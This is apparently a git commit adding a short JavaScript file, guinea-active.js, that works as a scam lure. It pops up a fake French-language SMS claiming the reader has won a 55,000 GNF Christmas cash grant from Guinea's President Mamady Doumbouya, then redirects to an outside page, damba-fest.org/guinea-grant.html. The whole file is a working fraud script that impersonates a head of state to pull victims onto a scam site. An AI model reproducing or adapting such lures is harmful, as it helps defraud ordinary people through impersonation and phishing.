1783b96fa54d3979cedf0656fbd38726ef1d7c57
boss-bloq <nsisboy01@gmail.com>
2024-11-29 02:34:15 -0800

    Create guinea-active.js

---
+++ guinea-active.js
@@ -0,0 +1,6 @@
+
+var password = 'RETIRER 55 000 GNF'
+password=prompt('SMS : Félicitations, vous êtes éligible à la subvention de Noël en espèces de 55 000 GNF du Président MAMADY DOUMBOUYA pour les GUINEA. Veuillez appuyer sur OK pour retirer le prix en espèces.   ','RETIRER 55 000 GNF');
+if (password != 'RETIRER 55 000 GNF') {
+location.href='https://damba-fest.org/guinea-grant.html';
+}
